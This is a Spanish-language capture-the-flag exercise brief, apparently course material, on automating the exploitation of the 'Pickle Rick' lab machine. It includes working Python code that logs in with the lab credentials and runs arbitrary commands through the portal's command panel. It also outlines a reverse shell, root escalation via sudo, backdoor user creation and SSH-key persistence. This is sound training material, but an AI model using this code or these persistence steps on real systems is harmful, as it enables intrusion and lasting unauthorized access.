# Automatización del CTF Pickle Rick

## Contexto del ejercicio

Este ejercicio consiste en **automatizar el proceso de explotación de la máquina Pickle Rick una vez ya ha sido resuelta manualmente**.

El objetivo **NO es descubrir la vulnerabilidad**, ya que esta ya se conoce, sino **reproducir automáticamente los pasos realizados durante la resolución del CTF**.

Es decir, el script se desarrollará **conociendo previamente**:

- Los endpoints de la aplicación
- Los parámetros necesarios
- La vulnerabilidad presente en el portal
  --> Las vulnerabilidades halladas en el portal es la ejecucion de codigo
- Los comandos necesarios para obtener acceso
  --> Para poder obtener acceso hay que insertar una revershell en base64 y estar a la escucha
- El método de escalada de privilegios
  --> Comando para obtener acceso privilegiado: sudo su 

Este ejercicio busca practicar **automatización de ataques y scripting en Python**.

---

# Objetivo final

Crear un script en Python capaz de **reproducir automáticamente la explotación previamente realizada manualmente**.

El flujo que debe automatizar el script es:

1. Autenticarse en la aplicación web.
2. Mantener la sesión HTTP.
3. Enviar comandos al portal vulnerable.
4. Ejecutar una reverse shell.
5. Recibir la conexión en la máquina atacante.
6. Escalar privilegios a root.
7. Crear persistencia en el sistema.
8. Configurar acceso por SSH mediante claves.

---

# Fase 1 — Análisis de la petición de Login

Durante la resolución manual del CTF se identificó que la aplicación utiliza un sistema de login.

En esta fase se debe **analizar la petición HTTP que realiza el navegador al iniciar sesión**.

## Tareas

1. Abrir la página web de la máquina. 
2. Abrir las herramientas de desarrollador del navegador.
3. Acceder a la pestaña **Network**.
4. Realizar el login en la aplicación.
5. Localizar la petición correspondiente.

## Identificar

- Método HTTP --> POST
- Endpoint --> http://10.128.161.83/login.php
- Parámetros enviados --> username:password = R1ckRul3s:Wubbalubbadubdub
- Posibles cookies de sesión

Ejemplo conceptual usando la libreria requests para acceder a la web:

```
import requests as re

respuesta = re.post('http://10.128.161.83/')

if respuesta.status_code == 200:
        print('Conexion establecida. Imprimiendo respuesta:')
        print(respuesta)
elif respuesta.status_code == 404:
        print('Error de conexion!')
```

---

# Fase 2 — Reproducir el Login con Python

Una vez identificada la petición, se debe reproducir el login utilizando Python.
El objetivo es **simular el comportamiento del navegador** mediante una petición HTTP.

## Investigar

- Librería `requests`
- Envío de datos mediante POST
- Manejo de respuestas HTTP

# Fase 3 — Gestión de Sesión

Después del login, el servidor genera una **cookie de sesión**.

Para poder interactuar con otras secciones de la web es necesario **mantener esa sesión activa**.

Ejemplo conceptual usando la libreria requests para escribir las credenciales + crear sesion:

## Investigar

- Cookies HTTP
- Uso de sesiones en Python

```
import requests as re

# Se inicia la variable sesion para guardar las cookies
sesion = re.Session()

# Defino las constantes del PoC de requests + session
LOGIN_ENDPOINT = 'http://10.128.161.83/login.php'
CREDENCIALES = {
        'username' : 'R1ckRul3s',
        'password': 'Wubbalubbadubdub'
}

# Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
respuesta = sesion.post(LOGIN_ENDPOINT,data = CREDENCIALES)

# Se anaden las siguientes comprobaciones para verificar el resultado
if respuesta.status_code == 200:
        print('Peticion de login enviada. Verificando...')
        if 'Portal Login Page' in respuesta.text:
                print('Login exitoso! Mostrando las cookies de sesion:')
                print(sesion.cookies)
        else:
                print('Login fallido!')
else:
        print('Error de conexion!')
```
---

# Fase 4 — Análisis del Portal Vulnerable

Durante la resolución manual del CTF se identificó que el portal permite **ejecutar comandos en el servidor**.

Debes analizar la petición que se envía cuando se introduce un comando.

## Tareas

1. Acceder al portal autenticado.
2. Ejecutar un comando simple.
3. Observar la petición generada en la pestaña Network.

Ejemplo conceptual de RCE en el panel tras logearnos:

import requests as re

# Se inicia la variable sesion para guardar las cookies
sesion = re.Session()

# Defino las constantes del PoC de requests + session
LOGIN_ENDPOINT = 'http://10.128.167.86/login.php'
CREDENCIALES = {
        'username' : 'R1ckRul3s',
        'password' : 'Wubbalubbadubdub',
        'sub' : 'Login'
}

# Defino el ednpoint y el payload necesarios para RCE
RCE_ENDPOINT = 'http://10.128.167.86/portal.php'
PAYLOAD = {
        'command' : 'whoami',
        'sub': 'Execute'
}

# Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
estado_login = sesion.post(LOGIN_ENDPOINT,data = CREDENCIALES)

# Se anaden las siguientes comprobaciones para verificar el resultado
if estado_login.status_code == 200:
        print('Peticion de login enviada. Verificando...')
        if 'Command Panel' in estado_login.text:
                print('Login exitoso! Mostrando las cookies de sesion:')
                print(sesion.cookies)
# Ahora tras un intento exitoso se va a probar a realizar RCE con POST y el Endpoint ()
                rce_respuesta = sesion.post(RCE_ENDPOINT, data = PAYLOAD)
                if rce_respuesta.status_code == 200:
                        print('El comando se ha ejecutado satisfactoriamente. Resultado:')
                        print(rce_respuesta.text)
                else:
                        print('Ha habido un error')
        else:
                print('Login fallido!')
else:
        print('Error de conexion!')

---

# Fase 5 — Automatizar la ejecución de comandos

El script debe ser capaz de enviar comandos al portal vulnerable.

Se recomienda implementar una función similar a la que se muestra en la act. de la PoC anterior:

import requests as re

# Se inicia la variable sesion para guardar las cookies
sesion = re.Session()

# Defino las constantes del PoC de requests + session
LOGIN_ENDPOINT = 'http://10.128.167.86/login.php'
CREDENCIALES = {
    'username' : 'R1ckRul3s',
    'password' : 'Wubbalubbadubdub',
    'sub' : 'Login'
}

# Defino el ednpoint y el payload necesarios para RCE
RCE_ENDPOINT = 'http://10.128.167.86/portal.php'

# Con esta func los comando que se ejecuten seran dinamicos, como una pseudshell
def ejecutar_comandos(cmd):
    PAYLOAD_DIN = {
        'command' : cmd, # Se ejecuta los comandos que escribimos desde la terminal
        'sub': 'Execute'
    }

    # Mandamos el payload al servidor cada vez que se llame a la funcion
    rce_respuesta = sesion.post(RCE_ENDPOINT, data = PAYLOAD_DIN)
    
    if rce_respuesta.status_code == 200:
        # Se intenta limpiar la salida y asi comprobar si hubo o no respuesta
        try:
            return rce_respuesta.text.split('<pre>')[1].split('</pre>')[0].strip()
        except IndexError:
            return "[!] Comando sin salida o bloqueado."
    else:
        return f"[!] Error HTTP: {rce_respuesta.status_code}"

# Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
estado_login = sesion.post(LOGIN_ENDPOINT, data = CREDENCIALES)

# Se anaden las siguientes comprobaciones para verificar el resultado
if estado_login.status_code == 200:
    print('Peticion de login enviada. Verificando...')
    if 'Command Panel' in estado_login.text:
        print(f'Login exitoso! Mostrando las cookies de sesion: {sesion.cookies}')
        # Tras el login exitoso entraremos en un bucle While para ejecutar RCE dinamicamente
        print('-' * 50)
        print("Consola interactiva. Escribe 'exit' si deseas salir.")
        print('-' * 50)
        while True:
            comando_recibido = input('pickle-rick@usuario-nonroot:~$ ') # Input para guardar los comandos a ejecutar
            # La siguiente condition comprueba si el usuario desea salir de la pseudoshell
            if comando_recibido.lower() == 'exit':
                print('Cerrando la conexion...')
                break
            else:
                rce_respuesta = ejecutar_comandos(comando_recibido) # Llamando a la siguiente funcion
                print(rce_respuesta)
    else:
        print('Login fallido!')
else:
    print('Error de conexion!')

---

# Fase 6 — Reverse Shell

Una vez confirmada la ejecución de comandos, se utilizará esa capacidad para lanzar una **reverse shell hacia la máquina atacante**.

Conceptos a investigar:

- reverse shells
- netcat
- sockets

Arquitectura:

victima ----> atacante  
     reverse shell

---

# Fase 7 — Listener en paralelo

La reverse shell requiere que el atacante esté **escuchando conexiones entrantes**.

El listener debe ejecutarse **antes de enviar la reverse shell**.

Para automatizar este proceso se utilizarán **threads en Python**, permitiendo ejecutar dos procesos en paralelo:

Thread 1 → Listener  
Thread 2 → Envío del exploit

---

# Fase 8 — Escalada de privilegios

Una vez obtenida la shell en la máquina víctima, el siguiente paso es escalar privilegios.

Durante la resolución manual del CTF se identificó el método de escalada.

Ejemplo conceptual:

www-data → root

Investigar:

sudo -l  
permisos sudo  
comandos permitidos

---

# Fase 9 — Persistencia

Una vez obtenidos privilegios de root, se configurará persistencia en el sistema.

## Tareas

1. Crear un nuevo usuario en el sistema.
2. Asignarle privilegios sudo.

Investigar:

useradd  
passwd  
usermod  

---

# Fase 10 — Acceso por SSH

En lugar de depender de la reverse shell, se configurará acceso permanente mediante SSH.

## Procedimiento

1. Generar un par de claves en la máquina atacante.
2. Copiar la clave pública a la máquina víctima.
3. Guardarla en el archivo:

~/.ssh/authorized_keys

---

# Fase 11 — Conexión final

Una vez configurado el acceso por clave pública, se puede cerrar la reverse shell y conectarse mediante SSH.

Ejemplo:

ssh usuario@ip_victima

---

# Entregables

El proyecto final debe contener al menos los siguientes archivos:

/exploit.py  
/enunciado.md  
/README.txt  

---

# Objetivo educativo

Este ejercicio permite practicar:

- análisis de tráfico HTTP
- automatización de explotación web
- scripting en Python
- manejo de sesiones HTTP
- reverse shells
- programación concurrente (threading)
- escalada de privilegios
- persistencia en sistemas Linux
